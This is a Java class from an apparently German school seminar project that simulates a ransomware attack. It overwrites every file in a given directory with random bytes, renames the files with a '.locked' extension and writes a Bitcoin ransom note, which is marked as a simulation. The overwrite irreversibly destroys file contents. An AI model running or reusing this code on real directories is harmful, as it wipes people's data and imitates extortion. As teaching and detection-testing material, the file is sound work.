package com.wseminar.simulation;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.List;

/**
 * Simuliert einen Ransomware-Angriff zu Testzwecken.
 *
 * WARNUNG: Nur für Test-Dateien verwenden!
 * Überschreibt Dateien mit Zufallsdaten und .locked Extension.
 */
public class RansomwareSimulator {

    private final SecureRandom random;
    private int filesEncrypted = 0;

    public RansomwareSimulator() {
        this.random = new SecureRandom();
    }

    /**
     * Simuliert Ransomware-Angriff auf einen Ordner.
     *
     * @param targetDirectory Ziel-Ordner
     * @return Anzahl verschlüsselter Dateien
     */
    public AttackResult attackDirectory(File targetDirectory) throws IOException {
        System.out.println("💀 RANSOMWARE-ANGRIFF GESTARTET!");
        System.out.println("   Ziel: " + targetDirectory.getAbsolutePath());
        System.out.println();

        if (!targetDirectory.exists() || !targetDirectory.isDirectory()) {
            throw new IOException("Ungültiger Ziel-Ordner!");
        }

        filesEncrypted = 0;
        List<File> encryptedFiles = new ArrayList<>();

        File[] files = targetDirectory.listFiles();
        if (files == null) {
            return new AttackResult(0, encryptedFiles);
        }

        // Alle Dateien "verschlüsseln"
        for (File file : files) {
            if (file.isFile() && !file.getName().endsWith(".locked")) {
                try {
                    encryptFile(file);
                    encryptedFiles.add(file);
                } catch (IOException e) {
                    System.out.println("   ⚠️  Konnte nicht verschlüsseln: " + file.getName());
                }
            }
        }

        System.out.println();
        System.out.println("💀 ANGRIFF ABGESCHLOSSEN!");
        System.out.println("   Verschlüsselt: " + filesEncrypted + " Datei(en)");
        System.out.println();

        // Erpresser-Nachricht erstellen
        createRansomNote(targetDirectory);

        return new AttackResult(filesEncrypted, encryptedFiles);
    }

    /**
     * "Verschlüsselt" eine einzelne Datei.
     * (Überschreibt mit Zufallsdaten + .locked Extension)
     */
    private void encryptFile(File file) throws IOException {
        System.out.println("   🔒 Verschlüssele: " + file.getName());

        // Datei mit Zufallsdaten überschreiben
        long fileSize = file.length();
        byte[] randomData = new byte[(int) Math.min(fileSize, 10000)]; // Max 10KB
        random.nextBytes(randomData);

        // Überschreiben
        Files.write(file.toPath(), randomData);

        // .locked Extension hinzufügen
        File lockedFile = new File(file.getAbsolutePath() + ".locked");
        if (file.renameTo(lockedFile)) {
            filesEncrypted++;
        }
    }

    /**
     * Erstellt Erpresser-Nachricht (README.txt).
     */
    private void createRansomNote(File directory) throws IOException {
        File noteFile = new File(directory, "README_RANSOM.txt");

        try (FileWriter writer = new FileWriter(noteFile)) {
            writer.write("╔════════════════════════════════════════╗\n");
            writer.write("║   IHRE DATEIEN WURDEN VERSCHLÜSSELT!   ║\n");
            writer.write("╚════════════════════════════════════════╝\n");
            writer.write("\n");
            writer.write("Alle Ihre wichtigen Dateien wurden mit\n");
            writer.write("militärischer Verschlüsselung gesichert.\n");
            writer.write("\n");
            writer.write("Um Ihre Dateien wiederherzustellen:\n");
            writer.write("1. Zahlen Sie 500€ in Bitcoin\n");
            writer.write("2. Senden Sie die Transaktion an: [BITCOIN-ADRESSE]\n");
            writer.write("3. Sie erhalten den Entschlüsselungs-Key\n");
            writer.write("\n");
            writer.write("⏰ Sie haben 48 Stunden!\n");
            writer.write("Danach werden die Daten unwiederbringlich gelöscht!\n");
            writer.write("\n");
            writer.write("═══════════════════════════════════════\n");
            writer.write("HINWEIS: Dies ist eine SIMULATION!\n");
            writer.write("Kein echter Ransomware-Angriff.\n");
            writer.write("W-Seminar Projekt 2025\n");
            writer.write("═══════════════════════════════════════\n");
        }

        System.out.println("   📝 Erpresser-Nachricht erstellt: " + noteFile.getName());
    }

    /**
     * Simuliert schnellen Massen-Angriff (viele Dateien auf einmal).
     */
    public AttackResult massAttack(File targetDirectory, int numFiles) throws IOException {
        System.out.println("💀💀💀 MASSEN-ANGRIFF GESTARTET!");
        System.out.println("   Erstelle " + numFiles + " Test-Dateien und verschlüssele sie...");
        System.out.println();

        // Test-Dateien erstellen
        targetDirectory.mkdirs();
        for (int i = 1; i <= numFiles; i++) {
            File testFile = new File(targetDirectory, "testfile_" + i + ".txt");
            try (FileWriter writer = new FileWriter(testFile)) {
                writer.write("Test-Datei #" + i + "\n");
                writer.write("Wichtige Daten hier...\n");
            }
        }

        System.out.println("   ✅ " + numFiles + " Test-Dateien erstellt");
        System.out.println();

        // Angriff starten
        return attackDirectory(targetDirectory);
    }

    /**
     * Gibt Anzahl verschlüsselter Dateien zurück.
     */
    public int getFilesEncrypted() {
        return filesEncrypted;
    }
}